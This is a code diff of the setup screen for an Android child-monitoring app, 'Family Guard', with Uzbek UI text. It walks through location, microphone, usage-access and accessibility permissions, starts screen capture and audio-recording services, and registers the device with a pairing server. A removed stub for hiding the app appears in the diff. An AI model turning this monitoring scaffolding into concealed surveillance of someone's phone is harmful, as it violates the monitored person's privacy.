@@ -18,21 +18,21 @@ import androidx.core.content.ContextCompat
 import java.util.UUID
 import kotlin.concurrent.thread
 
-/**
- * Family Guard child setup screen.
- *
- * Barcha runtime/special permissionlar avtomatik onCreate()da so'ralmaydi.
- * Foydalanuvchi "Barcha ruxsatlarni sozlash" tugmasini bosganda
- * permission wizard ketma-ket ishlaydi.
- */
 class MainActivity : AppCompatActivity() {
 
-    private val deviceId by lazy {
-        getPreferences(0)
-            .getString("deviceId", null)
+    private enum class SettingsStep {
+        NONE,
+        USAGE,
+        ACCESSIBILITY
+    }
+
+    private var setupRunning = false
+    private var awaitingSettings = SettingsStep.NONE
+
+    private val deviceId: String by lazy {
+        getPreferences(0).getString("deviceId", null)
             ?: UUID.randomUUID().toString().also {
-                getPreferences(0)
-                    .edit()
+                getPreferences(0).edit()
                     .putString("deviceId", it)
                     .apply()
             }
@@ -40,102 +40,20 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var tvPairing: TextView
     private lateinit var tvStatus: TextView
-
-    /**
-     * Permission wizard bosqichi.
-     *
-     * 0 = Notification
-     * 1 = Location
-     * 2 = Microphone
-     * 3 = Usage Access
-     * 4 = Accessibility
-     * 5 = Screen Capture
-     * 6 = tugagan
-     */
-    private var permissionStep = -1
-
-    // ---------------------------------------------------------
-    // SCREEN CAPTURE
-    // ---------------------------------------------------------
-
-    private val screenLauncher =
-        registerForActivityResult(
-            ActivityResultContracts.StartActivityForResult()
-        ) { result ->
-
-            val data = result.data
-
-            if (
-                result.resultCode == Activity.RESULT_OK &&
-                data != null
-            ) {
-
-                startChildService(
-                    Intent(
-                        this,
-                        ScreenCaptureService::class.java
-                    )
-                        .putExtra(
-                            "resultCode",
-                            result.resultCode
-                        )
-                        .putExtra(
-                            "code",
-                            data
-                        )
-                        .putExtra(
-                            "deviceId",
-                            deviceId
-                        )
-                        .putExtra(
-                            "enableProjection",
-                            true
-                        )
-                )
-
-                setStatus(
-                    "✅ Screen capture ruxsati berildi"
-                )
-
-            } else {
-
-                setStatus(
-                    "⚠️ Screen capture bekor qilindi"
-                )
-            }
-
-            // Screen Capture oxirgi bosqich.
-            if (permissionStep == 5) {
-                permissionStep = 6
-                continuePermissionSetup()
-            }
-        }
-
-    // ---------------------------------------------------------
-    // NOTIFICATION
-    // ---------------------------------------------------------
+    private lateinit var allPermissionsButton: Button
 
     private val notificationLauncher =
         registerForActivityResult(
             ActivityResultContracts.RequestPermission()
         ) { granted ->
-
-            if (granted) {
-                setStatus(
+            setStatus(
+                if (granted)
                     "✅ Bildirishnoma ruxsati berildi"
-                )
-            } else {
-                setStatus(
+                else
                     "⚠️ Bildirishnoma ruxsati berilmadi"
-                )
-            }
-
+            )
             continuePermissionSetup()
         }
-
-    // ---------------------------------------------------------
-    // LOCATION
-    // ---------------------------------------------------------
 
     private val locationLauncher =
         registerForActivityResult(
@@ -143,211 +61,548 @@ class MainActivity : AppCompatActivity() {
         ) { result ->
 
             val fine =
-                result[
-                    Manifest.permission.ACCESS_FINE_LOCATION
-                ] == true
+                result[Manifest.permission.ACCESS_FINE_LOCATION] == true
 
             val coarse =
-                result[
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                ] == true
+                result[Manifest.permission.ACCESS_COARSE_LOCATION] == true
 
-            if (fine || coarse) {
-                setStatus(
+            setStatus(
+                if (fine || coarse)
                     "✅ Lokatsiya ruxsati berildi"
-                )
-            } else {
-                setStatus(
+                else
                     "⚠️ Lokatsiya ruxsati berilmadi"
-                )
-            }
+            )
 
             continuePermissionSetup()
         }
-
-    // ---------------------------------------------------------
-    // MICROPHONE
-    // ---------------------------------------------------------
 
     private val microphoneLauncher =
         registerForActivityResult(
             ActivityResultContracts.RequestPermission()
         ) { granted ->
 
-            if (granted) {
-                setStatus(
+            setStatus(
+                if (granted)
                     "✅ Mikrofon ruxsati berildi"
-                )
-            } else {
-                setStatus(
+                else
                     "⚠️ Mikrofon ruxsati berilmadi"
-                )
-            }
+            )
 
             continuePermissionSetup()
         }
 
-    // ---------------------------------------------------------
-    // ACTIVITY
-    // ---------------------------------------------------------
+    private val screenLauncher =
+        registerForActivityResult(
+            ActivityResultContracts.StartActivityForResult()
+        ) { result ->
 
-    override fun onCreate(
-        savedInstanceState: Bundle?
-    ) {
+            try {
+                val data = result.data
+
+                if (
+                    result.resultCode == Activity.RESULT_OK &&
+                    data != null
+                ) {
+                    startChildService(
+                        Intent(
+                            this,
+                            ScreenCaptureService::class.java
+                        )
+                            .putExtra(
+                                "resultCode",
+                                result.resultCode
+                            )
+                            .putExtra(
+                                "code",
+                                data
+                            )
+                            .putExtra(
+                                "deviceId",
+                                deviceId
+                            )
+                            .putExtra(
+                                "enableProjection",
+                                true
+                            )
+                    )
+
+                    setStatus(
+                        "✅ Screen capture ruxsati berildi"
+                    )
+                } else {
+                    setStatus(
+                        "⚠️ Screen capture bekor qilindi"
+                    )
+                }
+
+            } catch (_: Exception) {
+                setStatus(
+                    "⚠️ Screen capture ishga tushmadi"
+                )
+            } finally {
+                setupRunning = false
+                allPermissionsButton.isEnabled = true
+            }
+        }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        createUi()
-
-        /*
-         * Bu yerda permission so'ralmaydi.
-         *
-         * Faqat mavjud child service ishga tushiriladi.
-         */
-        startChildService(
-            Intent(
-                this,
-                ScreenCaptureService::class.java
-            )
-                .putExtra(
-                    "deviceId",
-                    deviceId
-                )
-        )
-
+        buildUi()
         registerDevice()
+
+        try {
+            startChildService(
+                Intent(
+                    this,
+                    ScreenCaptureService::class.java
+                )
+                    .putExtra(
+                        "deviceId",
+                        deviceId
+                    )
+            )
+        } catch (_: Exception) {
+            setStatus(
+                "⚠️ Monitoring xizmati ishga tushmadi"
+            )
+        }
     }
 
-    // ---------------------------------------------------------
-    // UI
-    // ---------------------------------------------------------
+    override fun onResume() {
+        super.onResume()
 
-    private fun createUi() {
+        try {
+            when (awaitingSettings) {
 
-        val root =
-            LinearLayout(this).apply {
+                SettingsStep.USAGE -> {
+                    if (AppHelper(this).hasUsagePermission()) {
+                        awaitingSettings = SettingsStep.NONE
+                        setStatus(
+                            "✅ Usage Access yoqildi"
+                        )
+                        continuePermissionSetup()
+                    }
+                }
 
-                orientation =
-                    LinearLayout.VERTICAL
+                SettingsStep.ACCESSIBILITY -> {
+                    if (
+                        FamilyGuardAccessibilityService
+                            .isEnabled()
+                    ) {
+                        awaitingSettings = SettingsStep.NONE
+                        setStatus(
+                            "✅ Accessibility yoqildi"
+                        )
+                        continuePermissionSetup()
+                    }
+                }
 
-                setPadding(
-                    40,
-                    60,
-                    40,
-                    40
-                )
+                SettingsStep.NONE -> Unit
             }
+        } catch (_: Exception) {
+            awaitingSettings = SettingsStep.NONE
+            setupRunning = false
+            allPermissionsButton.isEnabled = true
 
-        tvPairing =
-            TextView(this).apply {
+            setStatus(
+                "⚠️ Sozlama tekshirilayotganda xatolik"
+            )
+        }
+    }
 
-                textSize = 16f
+    private fun buildUi() {
 
-                text =
-                    "Ulanmoqda..."
-            }
+        val root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(
+                40,
+                60,
+                40,
+                40
+            )
+        }
 
-        tvStatus =
-            TextView(this).apply {
+        tvPairing = TextView(this).apply {
+            textSize = 16f
+            text =
+                "Device ID: $deviceId\nUlanmoqda..."
+        }
 
-                textSize = 13f
+        tvStatus = TextView(this).apply {
+            textSize = 13f
+            setPadding(
+                0,
+                8,
+                0,
+                24
+            )
+        }
 
-                setPadding(
-                    0,
-                    8,
-                    0,
-                    24
-                )
-
-                text =
-                    "Ruxsatlarni sozlash uchun tugmani bosing."
-            }
-
-        // -----------------------------------------------------
-        // ASOSIY PERMISSION TUGMASI
-        // -----------------------------------------------------
-
-        val allPermissionsButton =
+        allPermissionsButton =
             makeBtn(
                 "🔐 Barcha ruxsatlarni sozlash"
             ) {
                 startPermissionSetup()
             }
 
-        // -----------------------------------------------------
-        // AUDIO
-        // -----------------------------------------------------
-
-        val audioStartButton =
-            makeBtn(
-                "🎙 Audio yozishni yoqish"
-            ) {
-                startAudioRecording()
-            }
-
-        val audioStopButton =
-            makeBtn(
-                "⏹ Audio yozishni to‘xtatish"
-            ) {
-                stopAudioRecording()
-            }
-
-        // -----------------------------------------------------
-        // YASHIRISH
-        // -----------------------------------------------------
-        //
-        // Bu alohida qoladi.
-        // Mavjud hiding funksiyang bo'lsa shu callback ichiga
-        // o'sha funksiyani ulaysan.
-        //
-
-        val hideButton =
-            makeBtn(
-                "🙈 Yashirish"
-            ) {
-                setStatus(
-                    "Ilovani yashirish funksiyasi alohida ishlaydi."
-                )
-
-                /*
-                 * Mavjud hide logic shu yerda qoladi.
-                 *
-                 * Masalan:
-                 * hideApp()
-                 */
-            }
-
         root.addView(tvPairing)
         root.addView(tvStatus)
-
         root.addView(
             allPermissionsButton
         )
 
         root.addView(
-            audioStartButton
+            makeBtn(
+                "🎙️ Audio yozishni boshlash"
+            ) {
+                startAudioRecording()
+            }
         )
 
         root.addView(
-            audioStopButton
+            makeBtn(
+                "⏹️ Audio yozishni to‘xtatish"
+            ) {
+                stopAudioRecording()
+            }
         )
 
         root.addView(
-            hideButton
+            makeBtn(
+                "📱 Screen capture"
+            ) {
+                requestScreenOnly()
+            }
+        )
+
+        root.addView(
+            makeBtn(
+                "🙈 Oynani yopish"
+            ) {
+                finishAndRemoveTask()
+            }
         )
 
         setContentView(root)
     }
 
-    // ---------------------------------------------------------
-    // DEVICE REGISTER
-    // ---------------------------------------------------------
+    private fun startPermissionSetup() {
+
+        if (setupRunning) return
+
+        setupRunning = true
+        awaitingSettings = SettingsStep.NONE
+        allPermissionsButton.isEnabled = false
+
+        setStatus(
+            "🔐 Ruxsatlar tekshirilmoqda..."
+        )
+
+        continuePermissionSetup()
+    }
+
+    private fun continuePermissionSetup() {
+
+        if (!setupRunning) return
+
+        try {
+
+            /*
+             * 1. Notification
+             */
+
+            if (
+                Build.VERSION.SDK_INT >=
+                Build.VERSION_CODES.TIRAMISU &&
+                !hasPermission(
+                    Manifest.permission.POST_NOTIFICATIONS
+                )
+            ) {
+                setStatus(
+                    "🔔 Bildirishnoma ruxsati so‘ralmoqda..."
+                )
+
+                notificationLauncher.launch(
+                    Manifest.permission.POST_NOTIFICATIONS
+                )
+
+                return
+            }
+
+            /*
+             * 2. Location
+             */
+
+            if (!hasLocationPermission()) {
+
+                setStatus(
+                    "📍 Lokatsiya ruxsati so‘ralmoqda..."
+                )
+
+                locationLauncher.launch(
+                    arrayOf(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                    )
+                )
+
+                return
+            }
+
+            /*
+             * 3. Microphone
+             */
+
+            if (
+                !hasPermission(
+                    Manifest.permission.RECORD_AUDIO
+                )
+            ) {
+
+                setStatus(
+                    "🎙️ Mikrofon ruxsati so‘ralmoqda..."
+                )
+
+                microphoneLauncher.launch(
+                    Manifest.permission.RECORD_AUDIO
+                )
+
+                return
+            }
+
+            /*
+             * 4. Usage Access
+             */
+
+            if (!AppHelper(this).hasUsagePermission()) {
+
+                awaitingSettings =
+                    SettingsStep.USAGE
+
+                setStatus(
+                    "📊 Sozlamalarda Usage Access ni yoqing"
+                )
+
+                safeStartActivity(
+                    Intent(
+                        Settings.ACTION_USAGE_ACCESS_SETTINGS
+                    )
+                )
+
+                return
+            }
+
+            /*
+             * 5. Accessibility
+             */
+
+            if (
+                !FamilyGuardAccessibilityService
+                    .isEnabled()
+            ) {
+
+                awaitingSettings =
+                    SettingsStep.ACCESSIBILITY
+
+                setStatus(
+                    "♿ Sozlamalarda Family Guard Accessibility xizmatini yoqing"
+                )
+
+                safeStartActivity(
+                    Intent(
+                        Settings.ACTION_ACCESSIBILITY_SETTINGS
+                    )
+                )
+
+                return
+            }
+
+            /*
+             * Hammasi tayyor.
+             */
+
+            setupRunning = false
+            awaitingSettings = SettingsStep.NONE
+            allPermissionsButton.isEnabled = true
+
+            setStatus(
+                "✅ Ruxsatlar sozlandi. Berilgan ruxsatlar avtomatik o‘tkazib yuborildi."
+            )
+
+        } catch (_: Exception) {
+
+            setupRunning = false
+            awaitingSettings = SettingsStep.NONE
+            allPermissionsButton.isEnabled = true
+
+            setStatus(
+                "⚠️ Bu bosqich ishlamadi. Qolgan ilova ishlashda davom etadi."
+            )
+        }
+    }
+
+    private fun requestScreenOnly() {
+
+        try {
+
+            val manager =
+                getSystemService(
+                    MEDIA_PROJECTION_SERVICE
+                ) as MediaProjectionManager
+
+            screenLauncher.launch(
+                manager.createScreenCaptureIntent()
+            )
+
+        } catch (_: Exception) {
+
+            setStatus(
+                "⚠️ Screen capture hozir mavjud emas"
+            )
+        }
+    }
+
+    private fun startAudioRecording() {
+
+        try {
+
+            if (
+                !hasPermission(
+                    Manifest.permission.RECORD_AUDIO
+                )
+            ) {
+
+                setStatus(
+                    "⚠️ Avval mikrofon ruxsatini bering"
+                )
+
+                return
+            }
+
+            val intent =
+                Intent(
+                    this,
+                    AudioRecordingService::class.java
+                )
+                    .setAction(
+                        AudioRecordingService.ACTION_START
+                    )
+
+            ContextCompat.startForegroundService(
+                this,
+                intent
+            )
+
+            setStatus(
+                "🔴 Audio yozish boshlandi"
+            )
+
+        } catch (_: Exception) {
+
+            setStatus(
+                "⚠️ Audio yozish ishga tushmadi"
+            )
+        }
+    }
+
+    private fun stopAudioRecording() {
+
+        try {
+
+            val intent =
+                Intent(
+                    this,
+                    AudioRecordingService::class.java
+                )
+                    .setAction(
+                        AudioRecordingService.ACTION_STOP
+                    )
+
+            startService(intent)
+
+            setStatus(
+                "⏹️ Audio yozish to‘xtatildi"
+            )
+
+        } catch (_: Exception) {
+
+            setStatus(
+                "⚠️ Audio yozishni to‘xtatish muvaffaqiyatsiz"
+            )
+        }
+    }
+
+    private fun hasPermission(
+        permission: String
+    ): Boolean {
+
+        return ContextCompat.checkSelfPermission(
+            this,
+            permission
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasLocationPermission(): Boolean {
+
+        return hasPermission(
+            Manifest.permission.ACCESS_FINE_LOCATION
+        ) ||
+            hasPermission(
+                Manifest.permission.ACCESS_COARSE_LOCATION
+            )
+    }
+
+    private fun safeStartActivity(
+        intent: Intent
+    ) {
+
+        try {
+
+            startActivity(intent)
+
+        } catch (_: Exception) {
+
+            awaitingSettings = SettingsStep.NONE
+            setupRunning = false
+            allPermissionsButton.isEnabled = true
+
+            setStatus(
+                "⚠️ Android sozlamalarini ochib bo‘lmadi"
+            )
+        }
+    }
+
+    private fun startChildService(
+        intent: Intent
+    ) {
+
+        try {
+
+            ContextCompat.startForegroundService(
+                this,
+                intent
+            )
+
+        } catch (_: SecurityException) {
+
+            setStatus(
+                "⚠️ Monitoring xizmati uchun Android ruxsati yetarli emas"
+            )
+
+        } catch (_: Exception) {
+
+            setStatus(
+                "⚠️ Monitoring xizmati ishga tushmadi"
+            )
+        }
+    }
 
     private fun registerDevice() {
 
-        tvPairing.text =
-            "Device ID: $deviceId\nUlanmoqda..."
-
-        thread {
+        thread(
+            name = "family-guard-register"
+        ) {
 
             try {
 
@@ -366,50 +621,22 @@ class MainActivity : AppCompatActivity() {
                 runOnUiThread {
 
                     tvPairing.text =
-                        "✅ Ulandi!\nPairing kod: $code"
+                        "✅ Ulandi!\n" +
+                        "Device ID: $deviceId\n" +
+                        "Pairing kod: $code"
                 }
 
-            } catch (e: Exception) {
+            } catch (_: Exception) {
 
                 runOnUiThread {
 
                     tvPairing.text =
-                        "⚠️ Serverga ulanilmadi: ${
-                            e.message ?: "network error"
-                        }"
+                        "⚠️ Serverga ulanilmadi\n" +
+                        "Device ID: $deviceId"
                 }
             }
         }
     }
-
-    // ---------------------------------------------------------
-    // GENERIC SERVICE START
-    // ---------------------------------------------------------
-
-    private fun startChildService(
-        intent: Intent
-    ) {
-
-        try {
-
-            ContextCompat.startForegroundService(
-                this,
-                intent
-            )
-
-        } catch (e: Exception) {
-
-            setStatus(
-                "❌ Xizmat ishga tushmadi: ${
-                    e.message ?: "unknown error"
-                }"
-            )
-        }
-    }
-
-    // ---------------------------------------------------------
-    // BUTTON FACTORY
-    // ---------------------------------------------------------
 
     private fun makeBtn(
         text: String,
@@ -421,14 +648,20 @@ class MainActivity : AppCompatActivity() {
             this.text = text
 
             setOnClickListener {
-                onClick()
+
+                try {
+
+                    onClick()
+
+                } catch (_: Exception) {
+
+                    setStatus(
+                        "⚠️ Amal bajarilmadi, ilova ishlashda davom etadi"
+                    )
+                }
             }
         }
     }
-
-    // ---------------------------------------------------------
-    // STATUS
-    // ---------------------------------------------------------
 
     private fun setStatus(
         message: String
@@ -436,508 +669,6 @@ class MainActivity : AppCompatActivity() {
 
         if (::tvStatus.isInitialized) {
             tvStatus.text = message
-        }
-    }
-
-    // =========================================================
-    // PERMISSION WIZARD
-    // =========================================================
-
-    private fun startPermissionSetup() {
-
-        permissionStep = 0
-
-        setStatus(
-            "🔐 Ruxsatlarni sozlash boshlandi..."
-        )
-
-        continuePermissionSetup()
-    }
-
-    private fun continuePermissionSetup() {
-
-        when (permissionStep) {
-
-            // =================================================
-            // 0 — NOTIFICATION
-            // =================================================
-
-            0 -> {
-
-                permissionStep = 1
-
-                if (
-                    Build.VERSION.SDK_INT >=
-                    Build.VERSION_CODES.TIRAMISU
-                ) {
-
-                    val granted =
-                        ContextCompat.checkSelfPermission(
-                            this,
-                            Manifest.permission.POST_NOTIFICATIONS
-                        ) ==
-                            PackageManager.PERMISSION_GRANTED
-
-                    if (!granted) {
-
-                        setStatus(
-                            "🔔 Bildirishnoma ruxsatini bering..."
-                        )
-
-                        notificationLauncher.launch(
-                            Manifest.permission.POST_NOTIFICATIONS
-                        )
-
-                        return
-                    }
-                }
-
-                // Android 12 va pastida alohida
-                // notification permission yo'q.
-                continuePermissionSetup()
-            }
-
-            // =================================================
-            // 1 — LOCATION
-            // =================================================
-
-            1 -> {
-
-                permissionStep = 2
-
-                val fine =
-                    ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.ACCESS_FINE_LOCATION
-                    ) ==
-                        PackageManager.PERMISSION_GRANTED
-
-                val coarse =
-                    ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.ACCESS_COARSE_LOCATION
-                    ) ==
-                        PackageManager.PERMISSION_GRANTED
-
-                if (!fine && !coarse) {
-
-                    setStatus(
-                        "📍 Lokatsiya ruxsatini bering..."
-                    )
-
-                    locationLauncher.launch(
-                        arrayOf(
-                            Manifest.permission.ACCESS_FINE_LOCATION,
-                            Manifest.permission.ACCESS_COARSE_LOCATION
-                        )
-                    )
-
-                    return
-                }
-
-                continuePermissionSetup()
-            }
-
-            // =================================================
-            // 2 — MICROPHONE
-            // =================================================
-
-            2 -> {
-
-                permissionStep = 3
-
-                val granted =
-                    ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.RECORD_AUDIO
-                    ) ==
-                        PackageManager.PERMISSION_GRANTED
-
-                if (!granted) {
-
-                    setStatus(
-                        "🎙 Mikrofon ruxsatini bering..."
-                    )
-
-                    microphoneLauncher.launch(
-                        Manifest.permission.RECORD_AUDIO
-                    )
-
-                    return
-                }
-
-                continuePermissionSetup()
-            }
-
-            // =================================================
-            // 3 — USAGE ACCESS
-            // =================================================
-
-            3 -> {
-
-                permissionStep = 4
-
-                if (
-                    !AppHelper(this)
-                        .hasUsagePermission()
-                ) {
-
-                    setStatus(
-                        "📊 Usage Access ochiladi. Family Guard'ni yoqing."
-                    )
-
-                    startActivity(
-                        Intent(
-                            Settings.ACTION_USAGE_ACCESS_SETTINGS
-                        )
-                    )
-
-                    return
-                }
-
-                continuePermissionSetup()
-            }
-
-            // =================================================
-            // 4 — ACCESSIBILITY
-            // =================================================
-
-            4 -> {
-
-                permissionStep = 5
-
-                if (
-                    !FamilyGuardAccessibilityService
-                        .isEnabled()
-                ) {
-
-                    setStatus(
-                        "♿ Accessibility ochiladi. Family Guard'ni yoqing."
-                    )
-
-                    startActivity(
-                        Intent(
-                            Settings.ACTION_ACCESSIBILITY_SETTINGS
-                        )
-                    )
-
-                    return
-                }
-
-                continuePermissionSetup()
-            }
-
-            // =================================================
-            // 5 — SCREEN CAPTURE
-            // =================================================
-
-            5 -> {
-
-                setStatus(
-                    "📸 Screen capture ruxsatini bering..."
-                )
-
-                requestScreen()
-
-                return
-            }
-
-            // =================================================
-            // 6 — DONE
-            // =================================================
-
-            else -> {
-
-                setStatus(
-                    "✅ Barcha mavjud ruxsatlar sozlandi!"
-                )
-
-                getPreferences(0)
-                    .edit()
-                    .putBoolean(
-                        "permission_setup_completed",
-                        true
-                    )
-                    .apply()
-            }
-        }
-    }
-
-    // =========================================================
-    // SCREEN CAPTURE REQUEST
-    // =========================================================
-
-    private fun requestScreen() {
-
-        val manager =
-            getSystemService(
-                MEDIA_PROJECTION_SERVICE
-            ) as MediaProjectionManager
-
-        screenLauncher.launch(
-            manager.createScreenCaptureIntent()
-        )
-    }
-
-    // =========================================================
-    // INDIVIDUAL NOTIFICATION REQUEST
-    // =========================================================
-
-    private fun requestNotification() {
-
-        if (
-            Build.VERSION.SDK_INT <
-            Build.VERSION_CODES.TIRAMISU
-        ) {
-
-            setStatus(
-                "✅ Bu Android versiyasida alohida notification ruxsati kerak emas."
-            )
-
-            return
-        }
-
-        val granted =
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.POST_NOTIFICATIONS
-            ) ==
-                PackageManager.PERMISSION_GRANTED
-
-        if (granted) {
-
-            setStatus(
-                "✅ Bildirishnoma ruxsati bor."
-            )
-
-        } else {
-
-            notificationLauncher.launch(
-                Manifest.permission.POST_NOTIFICATIONS
-            )
-        }
-    }
-
-    // =========================================================
-    // INDIVIDUAL LOCATION REQUEST
-    // =========================================================
-
-    private fun requestLocation() {
-
-        val fine =
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            ) ==
-                PackageManager.PERMISSION_GRANTED
-
-        val coarse =
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ) ==
-                PackageManager.PERMISSION_GRANTED
-
-        if (fine || coarse) {
-
-            setStatus(
-                "✅ Lokatsiya ruxsati bor."
-            )
-
-            return
-        }
-
-        locationLauncher.launch(
-            arrayOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            )
-        )
-    }
-
-    // =========================================================
-    // INDIVIDUAL USAGE ACCESS
-    // =========================================================
-
-    private fun requestUsageStats() {
-
-        if (
-            AppHelper(this)
-                .hasUsagePermission()
-        ) {
-
-            setStatus(
-                "✅ Ilovalar statistikasi ruxsati bor."
-            )
-
-        } else {
-
-            setStatus(
-                "⚠️ Usage Access ochiladi. Family Guard'ni yoqing."
-            )
-
-            startActivity(
-                Intent(
-                    Settings.ACTION_USAGE_ACCESS_SETTINGS
-                )
-            )
-        }
-    }
-
-    // =========================================================
-    // INDIVIDUAL ACCESSIBILITY
-    // =========================================================
-
-    private fun requestAccessibility() {
-
-        if (
-            FamilyGuardAccessibilityService
-                .isEnabled()
-        ) {
-
-            setStatus(
-                "✅ Accessibility yoqilgan."
-            )
-
-        } else {
-
-            setStatus(
-                "⚠️ Accessibility sozlamalarida Family Guard'ni yoqing."
-            )
-
-            startActivity(
-                Intent(
-                    Settings.ACTION_ACCESSIBILITY_SETTINGS
-                )
-            )
-        }
-    }
-
-    // =========================================================
-    // AUDIO RECORDING
-    // =========================================================
-    //
-    // Recording faqat foydalanuvchi tugmani bosganda boshlanadi.
-    // Mikrofon ishlayotganida Android foreground notification/
-    // microphone indicator ko'rinadi.
-    // =========================================================
-
-    private fun startAudioRecording() {
-
-        val granted =
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) ==
-                PackageManager.PERMISSION_GRANTED
-
-        if (!granted) {
-
-            setStatus(
-                "⚠️ Avval 'Barcha ruxsatlarni sozlash' orqali mikrofon ruxsatini bering."
-            )
-
-            return
-        }
-
-        val intent =
-            Intent(
-                this,
-                AudioRecordingService::class.java
-            ).apply {
-
-                action =
-                    AudioRecordingService.ACTION_START
-            }
-
-        try {
-
-            ContextCompat.startForegroundService(
-                this,
-                intent
-            )
-
-            setStatus(
-                "🔴 Audio yozish boshlandi. Android mikrofon indikatori ko‘rinadi."
-            )
-
-        } catch (e: Exception) {
-
-            setStatus(
-                "❌ Audio service ishga tushmadi: ${
-                    e.message ?: "unknown error"
-                }"
-            )
-        }
-    }
-
-    // =========================================================
-    // AUDIO STOP
-    // =========================================================
-
-    private fun stopAudioRecording() {
-
-        val intent =
-            Intent(
-                this,
-                AudioRecordingService::class.java
-            ).apply {
-
-                action =
-                    AudioRecordingService.ACTION_STOP
-            }
-
-        try {
-
-            startService(intent)
-
-            setStatus(
-                "⏹ Audio yozish to‘xtatildi."
-            )
-
-        } catch (e: Exception) {
-
-            setStatus(
-                "❌ Audio service to‘xtatilmadi: ${
-                    e.message ?: "unknown error"
-                }"
-            )
-        }
-    }
-
-    // =========================================================
-    // SETTINGS'DAN QAYTISH
-    // =========================================================
-
-    override fun onResume() {
-
-        super.onResume()
-
-        /*
-         * Usage Access va Accessibility Android Settings orqali
-         * beriladi. Foydalanuvchi qaytganda keyingi bosqichni
-         * davom ettiramiz.
-         */
-
-        when (permissionStep) {
-
-            4 -> {
-                if (
-                    FamilyGuardAccessibilityService
-                        .isEnabled()
-                ) {
-                    continuePermissionSetup()
-                }
-            }
-
-            3 -> {
-                if (
-                    AppHelper(this)
-                        .hasUsagePermission()
-                ) {
-                    continuePermissionSetup()
-                }
-            }
         }
     }
 }
